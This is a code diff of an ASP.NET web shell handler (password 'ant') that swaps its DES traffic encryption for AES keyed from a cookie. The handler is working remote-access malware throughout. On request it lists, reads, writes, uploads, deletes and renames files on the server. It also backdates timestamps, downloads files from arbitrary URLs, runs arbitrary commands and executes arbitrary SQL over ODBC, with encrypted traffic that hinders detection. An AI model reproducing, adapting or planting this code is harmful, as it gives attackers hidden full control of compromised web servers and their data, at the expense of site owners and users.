@@ -34,10 +34,9 @@
 *    1. 文件系统 和 terminal 管理
 *    2. ODBC 数据库支持
 *    3. 支持 base64 和 hex 编码
-*
-*   Date：2019/08/22 v1.1 By：Ch1ng
-*    1. 在原脚本基础上增加 DES 传输数据双向加/解密
-*
+*   
+*   Date: 2019/08/24 v1.1
+*    1. 增加 AES 编码/解码功能
 **/
 --%>
 <%@ WebHandler Language="C#" Class="Handler" %>
@@ -51,77 +50,101 @@ using System.Data;
 using System.Data.SqlClient;
 using System.Diagnostics;
 using System.Security.Cryptography;
-
-public class Handler : IHttpHandler {
+public class Handler1 : IHttpHandler
+{
     public String pwd = "ant";
     public String cs = "UTF-8";
-    public String encoder = "des";
+    public String encoder = "aes";
     public String key = "";
-    public void ProcessRequest(HttpContext context){
+    public void ProcessRequest(HttpContext context)
+    {
         String Z = context.Request.Form[pwd];
-        try{
+        try
+        {
             key = HttpContext.Current.Request.Cookies.Get("CUSTOMSESSID").Value.ToString();
-        }catch (Exception e){
+        }
+        catch (Exception e)
+        {
             key = "";
         }
-        if (Z != "") {
+        if (Z != "")
+        {
             String Z0 = decode(context.Request.Form["z0"]);
             String Z1 = decode(context.Request.Form["z1"]);
             String Z2 = decode(context.Request.Form["z2"]);
             String Z3 = decode(context.Request.Form["z3"]);
             String R = "";
-            try{
-                switch (Z) {
-                    case "A": {
+            try
+            {
+                switch (Z)
+                {
+                    case "A":
+                        {
                             String[] c = Directory.GetLogicalDrives();
                             R = String.Format("{0}\t", context.Server.MapPath("/"));
                             for (int i = 0; i < c.Length; i++)
                                 R += c[i][0] + ":";
                             break;
                         }
-                    case "B": {
+                    case "B":
+                        {
                             DirectoryInfo m = new DirectoryInfo(Z1);
-                            foreach (DirectoryInfo D in m.GetDirectories()){
+                            foreach (DirectoryInfo D in m.GetDirectories())
+                            {
                                 R += String.Format("{0}/\t{1}\t0\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"));
                             }
-                            foreach (FileInfo D in m.GetFiles()){
+                            foreach (FileInfo D in m.GetFiles())
+                            {
                                 R += String.Format("{0}\t{1}\t{2}\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"), D.Length);
+                            }
+                            if (R == "")
+                            {
+                                R = "ERROR:// 目录中没有任何文件!";
                             }
                             break;
                         }
-                    case "C": {
+                    case "C":
+                        {
                             StreamReader m = new StreamReader(Z1, Encoding.GetEncoding(cs));
                             R = m.ReadToEnd();
                             m.Close();
                             break;
                         }
-                    case "D": {
+                    case "D":
+                        {
                             StreamWriter m = new StreamWriter(Z1, false, Encoding.GetEncoding(cs));
                             m.Write(Z2);
                             R = "1";
                             m.Close();
                             break;
                         }
-                    case "E": {
-                            if (Directory.Exists(Z1)){
+                    case "E":
+                        {
+                            if (Directory.Exists(Z1))
+                            {
                                 Directory.Delete(Z1, true);
-                            }else{
+                            }
+                            else
+                            {
                                 File.Delete(Z1);
                             }
                             R = "1";
                             break;
                         }
-                    case "F": {
+                    case "F":
+                        {
                             context.Response.Clear();
                             context.Response.Write("\x2D\x3E\x7C");
                             context.Response.WriteFile(Z1);
                             context.Response.Write("\x7C\x3C\x2D");
                             goto End;
                         }
-                    case "U": {
+                    case "U":
+                        {
                             String P = Z1;
-                            byte [] B = new Byte[Z2.Length/2];
-                            for(int i=0; i < Z2.Length; i+=2){
+                            byte[] B = new Byte[Z2.Length / 2];
+                            for (int i = 0; i < Z2.Length; i += 2)
+                            {
                                 B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);
                             }
                             FileStream fs = new FileStream(Z1, FileMode.Create);
@@ -130,32 +153,42 @@ public class Handler : IHttpHandler {
                             R = "1";
                             break;
                         }
-                    case "H": {
+                    case "H":
+                        {
                             CP(Z1, Z2, context);
                             R = "1";
                             break;
                         }
-                    case "I": {
-                            if (Directory.Exists(Z1)){
+                    case "I":
+                        {
+                            if (Directory.Exists(Z1))
+                            {
                                 Directory.Move(Z1, Z2);
-                            }else{
+                            }
+                            else
+                            {
                                 File.Move(Z1, Z2);
                             }
                             R = "1";
                             break;
                         }
-                    case "J": {
+                    case "J":
+                        {
                             Directory.CreateDirectory(Z1);
                             R = "1";
                             break;
                         }
-                    case "K": {
+                    case "K":
+                        {
                             DateTime TM = Convert.ToDateTime(Z2);
-                            if (Directory.Exists(Z1)){
+                            if (Directory.Exists(Z1))
+                            {
                                 Directory.SetCreationTime(Z1, TM);
                                 Directory.SetLastWriteTime(Z1, TM);
                                 Directory.SetLastAccessTime(Z1, TM);
-                            }else{
+                            }
+                            else
+                            {
                                 File.SetCreationTime(Z1, TM);
                                 File.SetLastWriteTime(Z1, TM);
                                 File.SetLastAccessTime(Z1, TM);
@@ -163,7 +196,8 @@ public class Handler : IHttpHandler {
                             R = "1";
                             break;
                         }
-                    case "L": {
+                    case "L":
+                        {
                             HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1));
                             RQ.Method = "GET";
                             RQ.ContentType = "application/x-www-form-urlencoded";
@@ -172,9 +206,11 @@ public class Handler : IHttpHandler {
                             FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write);
                             int i;
                             byte[] buffer = new byte[1024];
-                            while (true){
+                            while (true)
+                            {
                                 i = WF.Read(buffer, 0, buffer.Length);
-                                if (i < 1){
+                                if (i < 1)
+                                {
                                     break;
                                 }
                                 FS.Write(buffer, 0, i);
@@ -185,7 +221,8 @@ public class Handler : IHttpHandler {
                             R = "1";
                             break;
                         }
-                    case "M": {
+                    case "M":
+                        {
                             ProcessStartInfo c = new ProcessStartInfo(Z1);
                             Process e = new Process();
                             StreamReader OT, ER;
@@ -203,40 +240,48 @@ public class Handler : IHttpHandler {
                             R = OT.ReadToEnd() + ER.ReadToEnd();
                             break;
                         }
-                    case "N": {
+                    case "N":
+                        {
                             System.Data.DataSet ds = new System.Data.DataSet();
                             String strCon = Z1;
                             string sql = "show databases";
-                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon)){
+                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
+                            {
                                 dataAdapter.Fill(ds);
                                 R = parseDataset(ds, "\t", "\t", false);
                             }
                             break;
                         }
-                    case "O": {
+                    case "O":
+                        {
                             String strCon = Z1, strDb = Z2;
                             System.Data.DataSet ds = new System.Data.DataSet();
                             string sql = "show tables from " + strDb;
-                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon)){
+                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
+                            {
                                 dataAdapter.Fill(ds);
                                 R = parseDataset(ds, "\t", "\t", false);
                             }
                             break;
                         }
-                    case "P": {
+                    case "P":
+                        {
                             String strCon = Z1, strDb = Z2, strTable = Z3;
                             System.Data.DataSet ds = new System.Data.DataSet();
-                            string sql = "select * from "+strDb+"."+strTable+" limit 0,0";
-                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon)){
+                            string sql = "select * from " + strDb + "." + strTable + " limit 0,0";
+                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
+                            {
                                 dataAdapter.Fill(ds);
                                 R = parseDataset(ds, "\t", "", true);
                             }
                             break;
                         }
-                    case "Q":{
+                    case "Q":
+                        {
                             String strCon = Z1, sql = Z2;
                             System.Data.DataSet ds = new System.Data.DataSet();
-                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon)){
+                            using (System.Data.Odbc.OdbcDataAdapter dataAdapter = new System.Data.Odbc.OdbcDataAdapter(sql, strCon))
+                            {
                                 dataAdapter.Fill(ds);
                                 R = parseDataset(ds, "\t|\t", "\r\n", true);
                             }
@@ -244,152 +289,190 @@ public class Handler : IHttpHandler {
                         }
                     default: goto End;
                 }
-            }catch(Exception E){
-                R = "ERROR:// "+E.Message.ToString();
             }
-            context.Response.Write("\x2D\x3E\x7C"+encode(R)+"\x7C\x3C\x2D");
+            catch (Exception E)
+            {
+                R = "ERROR:// " + E.Message.ToString();
+            }
+            context.Response.Write("\x2D\x3E\x7C" + encode(R) + "\x7C\x3C\x2D");
         End:;
         }
     }
 
-    public bool IsReusable{
-        get {
+    public bool IsReusable
+    {
+        get
+        {
             return false;
         }
     }
 
-    public void CP(String S,String D,HttpContext context){
-        if(Directory.Exists(S)){
-            DirectoryInfo m=new DirectoryInfo(S);
+    public void CP(String S, String D, HttpContext context)
+    {
+        if (Directory.Exists(S))
+        {
+            DirectoryInfo m = new DirectoryInfo(S);
             Directory.CreateDirectory(D);
-            foreach(FileInfo F in m.GetFiles()){
-                File.Copy(S+"\\"+F.Name,D+"\\"+F.Name);
+            foreach (FileInfo F in m.GetFiles())
+            {
+                File.Copy(S + "\\" + F.Name, D + "\\" + F.Name);
             }
-            foreach(DirectoryInfo F in m.GetDirectories()){
+            foreach (DirectoryInfo F in m.GetDirectories())
+            {
                 CP(S + "\\" + F.Name, D + "\\" + F.Name, context);
             }
-        }else{
-            File.Copy(S,D);
+        }
+        else
+        {
+            File.Copy(S, D);
         }
     }
-    public String HexAsciiConvert(String hex) {
+    public String HexAsciiConvert(String hex)
+    {
         StringBuilder sb = new StringBuilder();
         int i;
-        for(i=0; i< hex.Length; i+=2){
-            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i,2), System.Globalization.NumberStyles.HexNumber))));
+        for (i = 0; i < hex.Length; i += 2)
+        {
+            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2), System.Globalization.NumberStyles.HexNumber))));
         }
         return sb.ToString();
     }
-    public String encode(String src){
+    public String encode(String src)
+    {
         String ret;
-        try{
-            switch (encoder) {
-                case "base64": {
+        try
+        {
+            switch (encoder)
+            {
+                case "base64":
+                    {
                         //ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                         ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                         break;
                     }
-                case "des": {
-                        ret = encryptForDES(key.Substring(0,8),src);
+                case "aes":
+                    {
+                        ret = EncryptAes(key, src);
                         break;
                     }
-                default:{
+                default:
+                    {
                         ret = src;
                         break;
                     }
             }
-        }catch(Exception E){
-            ret = src;
+        }
+        catch (Exception E)
+        {
+            ret = E.ToString();
         }
         return ret;
     }
 
-    public String decode(String src){
+    public String decode(String src)
+    {
         String ret;
         //src = System.Web.HttpUtility.UrlDecode(src);
-        try{
-            switch (encoder) {
-                case "base64": {
+        try
+        {
+            switch (encoder)
+            {
+                case "base64":
+                    {
                         ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                         break;
                     }
-                case "hex": {
+                case "hex":
+                    {
                         ret = HexAsciiConvert(src);
                         break;
                     }
-                case "des": {
-                        ret = decryptForDES(key.Substring(0,8),src);
+                case "aes":
+                    {
+                        ret = DecryptAes(key, src);
                         break;
                     }
-                default:{
+                default:
+                    {
                         ret = src;
                         break;
                     }
             }
-        }catch(Exception E){
+        }
+        catch (Exception E)
+        {
             ret = src;
         }
         return ret;
     }
-
-        //des 加密
-    public string encryptForDES(string key,string message)
+    public byte[] GetAesKey(string key)
     {
-        using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
+        if (string.IsNullOrEmpty(key))
         {
-            byte[] inputByteArray =System.Text.Encoding.GetEncoding(cs).GetBytes(message);
-            des.Key = UTF8Encoding.UTF8.GetBytes(key);
-            des.IV = UTF8Encoding.UTF8.GetBytes(key);
-            des.Mode = System.Security.Cryptography.CipherMode.ECB;
-            System.IO.MemoryStream ms = new System.IO.MemoryStream();
-            using (CryptoStream css = new CryptoStream(ms, des.CreateEncryptor(), CryptoStreamMode.Write))
-            {
-                css.Write(inputByteArray, 0, inputByteArray.Length);
-                css.FlushFinalBlock();
-                css.Close();
-            }
-            string str = Convert.ToBase64String(ms.ToArray());
-            ms.Close();
-            return str;
+            throw new ArgumentNullException("key", "Aes密钥不能为空");
         }
-    }
-    //des 解密
-    public string decryptForDES(string key,string message)
-    {
-        byte[] inputByteArray = Convert.FromBase64String(message);
-        using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
+        if (key.Length < 16)
         {
-            des.Key = UTF8Encoding.UTF8.GetBytes(key);
-            des.IV = UTF8Encoding.UTF8.GetBytes(key);
-            des.Mode = System.Security.Cryptography.CipherMode.ECB;
-            System.IO.MemoryStream ms = new System.IO.MemoryStream();
-            using (CryptoStream css = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write))
-            {
-                css.Write(inputByteArray, 0, inputByteArray.Length);
-                css.FlushFinalBlock();
-                css.Close();
-            }
-            string str = Encoding.GetEncoding(cs).GetString(ms.ToArray());
-                
-            ms.Close();
-            return str;
+            // 不足16补全
+            key = key.PadRight(16, 'a');
         }
+        if (key.Length > 16)
+        {
+            key = key.Substring(0, 16);
+        }
+        return Encoding.GetEncoding("UTF-8").GetBytes(key);
     }
 
-    public string parseDataset(DataSet ds, String columnsep, String rowsep, bool needcoluname){
-        if (ds == null || ds.Tables.Count <= 0){
+    public string EncryptAes(string key, string toEncrypt)
+    {
+
+        byte[] keyArray = GetAesKey(key);
+        byte[] toEncryptArray = Encoding.GetEncoding("UTF-8").GetBytes(toEncrypt);
+        RijndaelManaged rDel = new RijndaelManaged();//using System.Security.Cryptography;
+        rDel.Key = keyArray;
+        rDel.IV = keyArray;
+        rDel.Mode = CipherMode.CFB;//using System.Security.Cryptography;   
+        rDel.Padding = PaddingMode.Zeros;//using System.Security.Cryptography;
+        ICryptoTransform cTransform = rDel.CreateEncryptor();
+        byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
+        return Convert.ToBase64String(resultArray, 0, resultArray.Length);
+    }
+    public string DecryptAes(string key, string toDecrypt)
+    {
+        byte[] keyArray = GetAesKey(key);
+        byte[] toEncryptArray = Convert.FromBase64String(toDecrypt);
+        RijndaelManaged rDel = new RijndaelManaged();
+        rDel.Key = keyArray;
+        rDel.IV = keyArray;
+        rDel.Mode = CipherMode.CFB;//using System.Security.Cryptography;   
+        rDel.Padding = PaddingMode.Zeros;//using System.Security.Cryptography;   
+        ICryptoTransform cTransform = rDel.CreateDecryptor();
+        byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
+        return Encoding.GetEncoding("UTF-8").GetString(resultArray).Replace("\0", "");
+    }
+
+
+    public string parseDataset(DataSet ds, String columnsep, String rowsep, bool needcoluname)
+    {
+        if (ds == null || ds.Tables.Count <= 0)
+        {
             return "Status" + columnsep + rowsep + "True" + columnsep + rowsep;
         }
         StringBuilder sb = new StringBuilder();
-        if(needcoluname){
-            for(int i = 0; i < ds.Tables[0].Columns.Count; i++){
-                sb.AppendFormat("{0}{1}",ds.Tables[0].Columns[i].ColumnName, columnsep);
+        if (needcoluname)
+        {
+            for (int i = 0; i < ds.Tables[0].Columns.Count; i++)
+            {
+                sb.AppendFormat("{0}{1}", ds.Tables[0].Columns[i].ColumnName, columnsep);
             }
             sb.Append(rowsep);
         }
-        foreach (DataTable dt in ds.Tables){
-            foreach (DataRow dr in dt.Rows){
-                for (int i = 0; i < dr.Table.Columns.Count; i++){
+        foreach (DataTable dt in ds.Tables)
+        {
+            foreach (DataRow dr in dt.Rows)
+            {
+                for (int i = 0; i < dr.Table.Columns.Count; i++)
+                {
                     sb.AppendFormat("{0}{1}", ObjToStr(dr[i]), columnsep);
                 }
                 sb.Append(rowsep);
@@ -398,10 +481,13 @@ public class Handler : IHttpHandler {
         return sb.ToString();
     }
 
-    public string ObjToStr(object ob){
-        if (ob == null){
+    public string ObjToStr(object ob)
+    {
+        if (ob == null)
+        {
             return string.Empty;
-        }else
+        }
+        else
             return ob.ToString();
     }
 
